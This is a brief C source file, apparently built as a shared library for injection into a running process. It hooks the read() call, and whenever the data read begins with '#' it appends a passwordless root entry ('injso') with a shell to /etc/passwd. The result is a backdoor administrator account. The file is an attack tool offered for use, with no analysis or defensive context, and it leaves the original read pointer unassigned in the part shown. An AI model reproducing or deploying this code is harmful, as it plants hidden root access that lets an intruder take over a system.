/**
 * \file so.c
 * \author  wzj
 * \brief 
 * \version 
 * \note  
 * \date: 2012年08月27日星期一22:17:42
 */ 
#include <sys/types.h>
#include <stdio.h>

ssize_t (*oldread)(int fd, void *buf, size_t count);

ssize_t newread(int fd, void *buf, size_t count)
{
	ssize_t ret;
	FILE *fp;
	char ch = '#';

	ret = oldread(fd, buf, count);


	if(memcmp(buf, (void*)&ch, 1) == 0)
	{
		fp = fopen("/etc/passwd", "a");	
		fputs("injso::0:0:root:/root:/bin/sh\n", fp);
		fclose(fp);
	}

	return ret;
}

